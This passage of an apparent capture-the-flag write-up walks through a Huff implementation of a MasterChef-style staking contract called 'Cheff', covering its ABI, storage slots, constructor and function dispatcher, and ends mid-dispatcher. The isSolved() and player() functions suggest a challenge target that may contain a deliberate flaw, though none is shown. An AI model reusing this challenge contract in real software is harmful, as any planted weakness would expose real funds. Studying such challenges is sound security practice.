</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>massUpdatePools</span><span>() nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>updatePool</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>deposit</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid, uint</span><span style=color:#0086b3>256</span><span> amount) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid, uint</span><span style=color:#0086b3>256</span><span> amount) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>emergencyWithdraw</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>dev</span><span>(address devaddr) nonpayable </span><span style=color:#62a35c>returns</span><span> ()
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>sushi</span><span>() view </span><span style=color:#62a35c>returns</span><span> (address)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>devaddr</span><span>() view </span><span style=color:#62a35c>returns</span><span> (address)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>bonusEndBlock</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>sushiPerBlock</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>BONUS_MULTIPLIER</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>migrator</span><span>() view </span><span style=color:#62a35c>returns</span><span> (address)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>poolInfo</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid) view </span><span style=color:#62a35c>returns</span><span> (address,uint256,uint256,uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>userInfo</span><span>(uint</span><span style=color:#0086b3>256</span><span> pid, address user) view </span><span style=color:#62a35c>returns</span><span> (uint256,uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>totalAllocPoint</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>startBlock</span><span>() view </span><span style=color:#62a35c>returns</span><span> (uint256)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>player</span><span>() view </span><span style=color:#62a35c>returns</span><span> (address)
</span><span style=color:#a71d5d;font-weight:700>#define function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() view </span><span style=color:#62a35c>returns</span><span> (bool)
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define event </span><span>Deposit(</span><span style=color:#a71d5d;font-weight:700>address indexed</span><span> user, </span><span style=color:#a71d5d;font-weight:700>uint256 indexed</span><span> pid, </span><span style=color:#a71d5d;font-weight:700>uint256</span><span> amount)
</span><span style=color:#a71d5d;font-weight:700>#define event </span><span>Withdraw(</span><span style=color:#a71d5d;font-weight:700>address indexed</span><span> user, </span><span style=color:#a71d5d;font-weight:700>uint256 indexed</span><span> pid, </span><span style=color:#a71d5d;font-weight:700>uint256</span><span> amount)
</span><span style=color:#a71d5d;font-weight:700>#define event </span><span>EmergencyWithdraw(</span><span style=color:#a71d5d;font-weight:700>address indexed</span><span> user, </span><span style=color:#a71d5d;font-weight:700>uint256 indexed</span><span> pid, </span><span style=color:#a71d5d;font-weight:700>uint256</span><span> amount)
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>Unauthorized()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>OutOfBounds()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>NoMigrator()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>CallFailed()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>ReturnDataSizeIsZero()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>BadMigrate()
</span><span style=color:#a71d5d;font-weight:700>#define error </span><span>WithdrawNotGood()
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>BONUS_MULTIPLIER_CONSTANT</span><span> = </span><span style=color:#0086b3>0x0a
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>E</span><span> = </span><span style=color:#0086b3>0xe8d4a51000
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent : ABI Interface</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>interface </span><span style=color:#62a35c>ICheff </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>poolLength</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>add</span><span>(</span><span style=color:#0086b3>uint256 </span><span>allocPoint, </span><span style=color:#0086b3>address </span><span>lpToken, </span><span style=color:#0086b3>bool </span><span>withUpdate) </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>set</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid, </span><span style=color:#0086b3>uint256 </span><span>allocPoint, </span><span style=color:#0086b3>bool </span><span>withUpdate) </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setMigrator</span><span>(</span><span style=color:#0086b3>address </span><span>migrator) </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>migrate</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid) </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getMultiplier</span><span>(</span><span style=color:#0086b3>uint256 </span><span>from, </span><span style=color:#0086b3>uint256 </span><span>to) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>pendingSushi</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid, </span><span style=color:#0086b3>address </span><span>user) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>massUpdatePools</span><span>() </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>updatePool</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid) </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>deposit</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>withdraw</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>emergencyWithdraw</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid) </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>dev</span><span>(</span><span style=color:#0086b3>address </span><span>devaddr) </span><span style=color:#a71d5d;font-weight:700>external</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sushi</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>address</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>devaddr</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>address</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>bonusEndBlock</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sushiPerBlock</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>BONUS_MULTIPLIER</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>migrator</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>address</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>poolInfo</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>address</span><span>,</span><span style=color:#0086b3>uint256</span><span>,</span><span style=color:#0086b3>uint256</span><span>,</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>userInfo</span><span>(</span><span style=color:#0086b3>uint256 </span><span>pid, </span><span style=color:#0086b3>address </span><span>user) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>,</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>totalAllocPoint</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>startBlock</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>player</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>address</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>bool</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Deposit</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>user, </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>pid, </span><span style=color:#0086b3>uint256 </span><span>amount);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>Withdraw</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>user, </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>pid, </span><span style=color:#0086b3>uint256 </span><span>amount);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>event </span><span style=color:#62a35c>EmergencyWithdraw</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>user, </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>indexed </span><span>pid, </span><span style=color:#0086b3>uint256 </span><span>amount);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>Unauthorized</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>OutOfBounds</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>NoMigrator</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>CallFailed</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>ReturnDataSizeIsZero</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>BadMigrate</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>WithdrawNotGood</span><span>();
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Cheff </span><span>{
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>constant</span><span> BONUS_MULTIPLIER_CONSTANT </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0x0a</span><span>;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>constant</span><span> E </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0xe8d4a51000</span><span>;
</span><span>}
</span></code></pre></div></div><h3 id=storage-slot-definitions>Storage Slot Definitions</h3><p>Huff uses <code>FREE_STORAGE_POINTER()</code> to automatically assign sequential storage slots without manual tracking. Each invocation returns the next available unused storage slot, preventing storage collisions. These constants define where contract state variables are stored in persistent storage.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code : FREE_STORAGE_POINTER()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>SUSHI_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>DEVADDR_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>BONUS_END_BLOCK_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>SUSHI_PER_BLOCK_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>MIGRATOR_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>POOL_INFO_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>USER_INFO_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>TOTAL_ALLOC_POINT_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>START_BLOCK_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span><span style=color:#a71d5d;font-weight:700>#define constant </span><span style=color:#0086b3>PLAYER_SLOT</span><span> = </span><span style=color:#62a35c>FREE_STORAGE_POINTER()
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent : Storage slots</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Cheff </span><span>{
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> sushi;              </span><span style=color:#969896;font-style:italic>// SUSHI_SLOT = slot 0
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> devaddr;            </span><span style=color:#969896;font-style:italic>// DEVADDR_SLOT = slot 1
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> bonusEndBlock;      </span><span style=color:#969896;font-style:italic>// BONUS_END_BLOCK_SLOT = slot 2
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> sushiPerBlock;      </span><span style=color:#969896;font-style:italic>// SUSHI_PER_BLOCK_SLOT = slot 3
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> migrator;           </span><span style=color:#969896;font-style:italic>// MIGRATOR_SLOT = slot 4
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> poolInfoLength;     </span><span style=color:#969896;font-style:italic>// POOL_INFO_SLOT = slot 5 (array length)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>=> mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>UserInfo)) </span><span style=color:#a71d5d;font-weight:700>public</span><span> userInfo;  </span><span style=color:#969896;font-style:italic>// USER_INFO_SLOT = slot 6
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> totalAllocPoint;    </span><span style=color:#969896;font-style:italic>// TOTAL_ALLOC_POINT_SLOT = slot 7
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> startBlock;         </span><span style=color:#969896;font-style:italic>// START_BLOCK_SLOT = slot 8
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> player;             </span><span style=color:#969896;font-style:italic>// PLAYER_SLOT = slot 9
</span><span>}
</span></code></pre></div></div><h3 id=constructor-macro>Constructor Macro</h3><p>Macros in Huff organize reusable bytecode blocks that are inlined at the point of invocation during compilation. The <code>CONSTRUCTOR</code> macro executes once during contract deployment to initialize storage state. Unlike Solidity's implicit constructor, Huff requires explicit handling of constructor arguments and runtime bytecode deployment.<p>The constructor copies constructor arguments from the deployment bytecode to memory, then stores each argument in its designated storage slot. The final instructions copy the runtime bytecode (the actual contract code) and return it to complete deployment. This introduces several fundamental opcodes: <code>codesize</code> pushes the size of deployed bytecode to the stack; <code>codecopy</code> copies code from a source offset to memory destination with parameters (destOffset, offset, size); <code>mload</code> loads 32 bytes from memory at a specified offset; <code>sstore</code> stores a value to a storage slot taking (slot, value) parameters; <code>sub</code> subtracts the top two stack values; <code>dup1</code> duplicates the top stack item; <code>swap2</code> swaps the top stack item with the third item; and <code>return</code> halts execution returning data from memory with (offset, size) parameters.<p>Huff syntax introduces several important concepts: macros are defined using <code>#define macro NAME() = { ... }</code> to create reusable bytecode blocks; macro invocation like <code>OWNED_CONSTRUCTOR()</code> inlines another macro's code directly at that location during compilation; bracket notation <code>[CONSTANT_NAME]</code> pushes constant values onto the stack; literal hexadecimal values like <code>0xc0</code> and <code>0x00</code> are pushed directly to the stack; and single-line comments use <code>//</code> syntax similar to other programming languages.<div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code : CONSTRUCTOR()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>CONSTRUCTOR</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span>{
</span><span>    </span><span style=color:#62a35c>OWNED_CONSTRUCTOR</span><span>()              </span><span style=color:#969896;font-style:italic>// Initialize ownership (sets owner)
</span><span>    </span><span style=color:#0086b3>0xc0 0xe0 </span><span style=color:#a71d5d;font-weight:700>codesize sub           </span><span style=color:#969896;font-style:italic>// Calculate constructor args location: codesize - 0xe0 = args start
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>codecopy                    </span><span style=color:#969896;font-style:italic>// Copy 0xc0 bytes of constructor args to memory[0x00]
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mload                       </span><span style=color:#969896;font-style:italic>// Load first arg (sushi address) from memory[0x00]
</span><span>    </span><span style=color:#0086b3>[SUSHI_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore              </span><span style=color:#969896;font-style:italic>// Store to SUSHI_SLOT
</span><span>    </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mload                       </span><span style=color:#969896;font-style:italic>// Load second arg from memory[0x20]
</span><span>    </span><span style=color:#0086b3>[DEVADDR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore            </span><span style=color:#969896;font-style:italic>// Store to DEVADDR_SLOT
</span><span>    </span><span style=color:#0086b3>0x40 </span><span style=color:#a71d5d;font-weight:700>mload                       </span><span style=color:#969896;font-style:italic>// Load third arg from memory[0x40]
</span><span>    </span><span style=color:#0086b3>[SUSHI_PER_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore    </span><span style=color:#969896;font-style:italic>// Store to SUSHI_PER_BLOCK_SLOT
</span><span>    </span><span style=color:#0086b3>0x60 </span><span style=color:#a71d5d;font-weight:700>mload                       </span><span style=color:#969896;font-style:italic>// Load fourth arg from memory[0x60]
</span><span>    </span><span style=color:#0086b3>[START_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore        </span><span style=color:#969896;font-style:italic>// Store to START_BLOCK_SLOT
</span><span>    </span><span style=color:#0086b3>0x80 </span><span style=color:#a71d5d;font-weight:700>mload                       </span><span style=color:#969896;font-style:italic>// Load fifth arg from memory[0x80]
</span><span>    </span><span style=color:#0086b3>[BONUS_END_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore    </span><span style=color:#969896;font-style:italic>// Store to BONUS_END_BLOCK_SLOT
</span><span>    </span><span style=color:#0086b3>0xa0 </span><span style=color:#a71d5d;font-weight:700>mload                       </span><span style=color:#969896;font-style:italic>// Load sixth arg from memory[0xa0]
</span><span>    </span><span style=color:#0086b3>[PLAYER_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore             </span><span style=color:#969896;font-style:italic>// Store to PLAYER_SLOT
</span><span>    </span><span style=color:#0086b3>0x68 </span><span style=color:#a71d5d;font-weight:700>dup1                        </span><span style=color:#969896;font-style:italic>// Push runtime bytecode size (0x68 = 104 bytes)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>codesize sub                     </span><span style=color:#969896;font-style:italic>// Calculate runtime code start: codesize - 0x68
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 swap2                       </span><span style=color:#969896;font-style:italic>// Arrange stack for codecopy
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>codecopy                    </span><span style=color:#969896;font-style:italic>// Copy runtime bytecode to memory[0x00]
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>return                      </span><span style=color:#969896;font-style:italic>// Return runtime bytecode (deploys contract)
</span><span>}
</span></code></pre></div></div><div class=note-container><button class=note-toggle><div class=note-icon><p>Solidity Equivalent : constructor()</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Cheff </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Owned </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(
</span><span>        </span><span style=color:#0086b3>address </span><span>_sushi,
</span><span>        </span><span style=color:#0086b3>address </span><span>_devaddr,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>_sushiPerBlock,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>_startBlock,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>_bonusEndBlock,
</span><span>        </span><span style=color:#0086b3>address </span><span>_player
</span><span>    ) </span><span style=color:#62a35c>Owned</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>) {
</span><span>        sushi </span><span style=color:#a71d5d;font-weight:700>=</span><span> _sushi;
</span><span>        devaddr </span><span style=color:#a71d5d;font-weight:700>=</span><span> _devaddr;
</span><span>        sushiPerBlock </span><span style=color:#a71d5d;font-weight:700>=</span><span> _sushiPerBlock;
</span><span>        startBlock </span><span style=color:#a71d5d;font-weight:700>=</span><span> _startBlock;
</span><span>        bonusEndBlock </span><span style=color:#a71d5d;font-weight:700>=</span><span> _bonusEndBlock;
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>    }
</span><span>}
</span></code></pre></div></div><h3 id=main-entry-point-and-function-dispatching>Main Entry Point and Function Dispatching</h3><p>The <code>MAIN</code> macro is the contract's entry point for all transactions after deployment. Every external call executes this macro to route the transaction to the appropriate function based on the function selector in calldata.<p>Function dispatching extracts the 4-byte function selector from calldata and compares it against each defined function signature using the <code>__FUNC_SIG</code> builtin. This builtin generates the function selector (first 4 bytes of <code>keccak256(functionSignature)</code>) at compile time. The dispatcher duplicates the selector and compares it with each possible function, jumping to the corresponding implementation when a match is found. The dispatching process relies on several critical opcodes: <code>calldataload</code> loads 32 bytes from calldata at a specified offset; <code>shr</code> shifts a value right by a specified number of bits (0xe0 = 224 bits = 28 bytes, leaving only the 4-byte selector); <code>dup1</code> duplicates the top stack item for reuse in multiple comparisons; <code>eq</code> compares two values and pushes 1 if equal or 0 otherwise; <code>jumpi</code> performs a conditional jump to a destination if the condition is non-zero; and <code>revert</code> aborts execution and reverts all state changes.<p>Huff introduces several advanced concepts for control flow: the <code>takes(n) returns(m)</code> syntax specifies macro stack behavior where <code>takes</code> declares how many stack items the macro consumes as input and <code>returns</code> declares how many items it produces as output (for example, <code>takes(2) returns(1)</code> means the macro expects 2 values on the stack when called and leaves 1 value when finished, while <code>takes(0) returns(0)</code> indicates the macro starts with an empty stack and leaves it empty, serving as documentation for developers and enabling stack validation during compilation); <code>__FUNC_SIG(functionName)</code> is a compile-time builtin that generates function selectors by computing the first 4 bytes of <code>keccak256("functionName(types...)")</code> which the compiler replaces with a <code>PUSH4</code> opcode containing the actual selector value; labels like <code>pool_length_jump:</code> mark jump destinations in bytecode creating named positions that <code>jump</code> and <code>jumpi</code> opcodes can target to make control flow readable (during compilation labels are converted to absolute bytecode positions); and macro invocations like <code>POOL_LENGTH()</code> inline another macro's code at that location during compilation which unlike function calls have zero runtime overhead since the code is copied directly rather than jumped to.<p><div class=note-container><button class=note-toggle><div class=note-icon><p>Huff Code : MAIN()</div></button><div class=note-content style=display:none><pre class=language-huff data-lang=huff style=color:#323232;background-color:#fff><code class=language-huff data-lang=huff><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>MAIN</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#62a35c>NON_PAYABLE</span><span>()                          </span><span style=color:#969896;font-style:italic>// Revert if msg.value > 0
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>calldataload </span><span style=color:#0086b3>0xe0 </span><span style=color:#a71d5d;font-weight:700>shr             </span><span style=color:#969896;font-style:italic>// Extract function selector: calldata[0:32] >> 224
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(poolLength)            </span><span style=color:#a71d5d;font-weight:700>eq </span><span>pool_length_jump                  </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>__FUNC_SIG</span><span>(</span><span style=color:#a71d5d;font-weight:700>add</span><span>)                   </span><span style=color:#a71d5d;font-weight:700>eq </span><span>add_jump                          </span><span style=color:#a71d5d;font-weight:700>jumpi
